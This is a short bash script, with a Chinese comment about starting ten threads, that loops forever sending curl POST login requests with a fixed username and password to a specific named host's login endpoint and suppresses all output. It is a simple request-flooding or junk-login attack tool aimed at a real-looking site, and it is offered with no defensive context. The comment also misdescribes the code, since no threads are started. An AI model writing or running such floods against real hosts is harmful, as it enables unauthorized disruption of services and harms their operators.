#!/bin/bash

  # 这里假设您希望启动10个线程
    while true; do
        curl 'http://fxq.baobei.msivtca.top/store/Publics/login' \
            -H 'Content-Type: application/json' \
            --data-raw '{"username":"12312","password":"123"}' \
            >/dev/null 2>&1 
    done

